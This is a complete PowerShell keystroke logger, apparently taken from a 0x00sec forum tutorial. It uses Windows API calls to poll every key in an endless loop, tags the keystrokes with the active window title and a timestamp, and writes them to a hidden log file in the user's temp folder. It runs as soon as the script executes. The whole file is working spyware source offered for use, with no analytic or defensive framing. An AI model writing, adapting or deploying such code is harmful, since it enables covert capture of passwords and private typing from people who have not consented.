<#

PowerShell keystroke logger

Pasted together by
|-TheDoctor-|

Link:
https://0x00sec.org/t/plug-in-to-win-powershell-keylogger-part-2-3/1158

#>
function KeyLog {

    # MapVirtualKeyMapTypes
    # <summary>
    # uCode is a virtual-key code and is translated into a scan code.
    # If it is a virtual-key code that does not distinguish between left- and
    # right-hand keys, the left-hand scan code is returned.
    # If there is no translation, the function returns 0.
    # </summary>
    $MAPVK_VK_TO_VSC = 0x00

    # <summary>
    # uCode is a scan code and is translated into a virtual-key code that
    # does not distinguish between left- and right-hand keys. If there is no
    # translation, the function returns 0.
    # </summary>
    $MAPVK_VSC_TO_VK = 0x01

    # <summary>
    # uCode is a virtual-key code and is translated into an unshifted
    # character value in the low-order word of the return value. Dead keys (diacritics)
    # are indicated by setting the top bit of the return value. If there is no
    # translation, the function returns 0.
    # </summary>
    $MAPVK_VK_TO_CHAR = 0x02

    # <summary>
    # Windows NT/2000/XP: uCode is a scan code and is translated into a
    # virtual-key code that distinguishes between left- and right-hand keys. If
    # there is no translation, the function returns 0.
    # </summary>
    $MAPVK_VSC_TO_VK_EX = 0x03

    # <summary>
    # Not currently documented
    # </summary>
    $MAPVK_VK_TO_VSC_EX = 0x04

    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $foreground_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern IntPtr GetForegroundWindow();
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru
    $getForeground = Add-Type -MemberDefinition $foreground_sig -name "Win32MyGetForeground" -namespace Win32Functions -passThru
    
    $WindowTitle0=""

    while ($true) {
        Start-Sleep -Milliseconds 40
        $gotit = ""

        for ($char = 1; $char -le 254; $char++) {
            $vkey = $char
            $gotit = $getKeyState::GetAsyncKeyState($vkey)
			
			

            if ($gotit -eq -32767) {

                $EnterKey = $getKeyState::GetAsyncKeyState(13)
                $TabKey = $getKeyState::GetAsyncKeyState(9)
                $DeleteKey = $getKeyState::GetAsyncKeyState(46)
                $BackSpaceKey = $getKeyState::GetAsyncKeyState(8)
                $LeftArrow = $getKeyState::GetAsyncKeyState(37)
                $UpArrow = $getKeyState::GetAsyncKeyState(38)
                $RightArrow = $getKeyState::GetAsyncKeyState(39)
                $DownArrow = $getKeyState::GetAsyncKeyState(40)

                $caps_lock = [console]::CapsLock

                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)

                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)

                $TopWindow = $getForeground::GetForegroundWindow()
                $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle

				$LogOutput=""
				if($WindowTitle -ne $WindowTitle0)
				{
                    $TimeStamp = (Get-Date -Format HH:mm:ss)
                    $LogOutput +=  $TimeStamp + "`t`t`t`t`t"
					$LogOutput += "[" + $WindowTitle + "]`r`n"
                    
                    
					$WindowTitle0 = $WindowTitle

				}

				#$LogOutput = "`"" + $WindowTitle + "`"`t`t`t"

                $mychar = New-Object -TypeName "System.Text.StringBuilder";
                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)

                $LogOutput += $mychar.ToString();
                
                if ($EnterKey)     {$LogOutput += '[ENTER]'}
                if ($TabKey)       {$LogOutput += '[Tab]'}
                if ($DeleteKey)    {$LogOutput += '[Delete]'}
                if ($BackSpaceKey) {$LogOutput += '[Backspace]'}
                if ($LeftArrow)    {$LogOutput += '[Left Arrow]'}
                if ($RightArrow)   {$LogOutput += '[Right Arrow]'}
                if ($UpArrow)      {$LogOutput += '[Up Arrow]'}
                if ($DownArrow)    {$LogOutput += '[Down Arrow]'}

             
                if ($unicode_res -gt 0) {
                    $logfile = "$($env:TEMP)\key.log"
                    $LogOutput | Out-File -FilePath $logfile -Append
                }
            }
        }
    }
}



KeyLog